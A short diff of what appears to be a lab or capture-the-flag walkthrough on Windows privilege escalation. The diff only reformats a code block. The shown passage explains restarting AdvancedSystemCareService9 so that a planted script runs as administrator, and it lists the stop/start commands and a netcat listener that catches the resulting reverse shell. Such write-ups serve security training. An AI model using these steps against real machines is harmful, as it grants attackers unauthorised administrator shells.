@@ -118,9 +118,11 @@ We will use the Invoke-WebRequest tool from the target machine to request the fi
 
 Finally, we just need to stop and restart the service. When the service runs again, it will execute our script before the legitimate one, and it will call a listener that we have set up on our attacker machine as an administrator.
 
-```stop-service AdvancedSystemCareService9```
-```start-service AdvancedSystemCareService9```
-```nc -lvnp AtackerPort```
+```
+stop-service AdvancedSystemCareService9
+start-service AdvancedSystemCareService9
+nc -lvnp AtackerPort
+```
  
    
 
